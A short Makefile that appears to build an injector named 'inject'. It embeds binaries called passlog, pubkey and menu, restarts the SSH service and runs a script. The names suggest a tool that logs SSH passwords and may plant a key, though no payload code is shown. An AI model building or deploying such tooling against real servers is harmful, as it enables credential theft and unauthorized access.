all:
	$(MAKE) -C hook
	xxd -i hook/passlog.bin > src/passlog.c
	xxd -i hook/pubkey.bin > src/pubkey.c
	xxd -i hook/menu.bin > src/menu.c
	gcc -Wall -ggdb -I./include/ -o inject src/*.c 

run:
	/etc/init.d/ssh restart
	./run.sh

clean:
	rm -rf passlog.elf passlog.bin evil.elf evil.bin inject
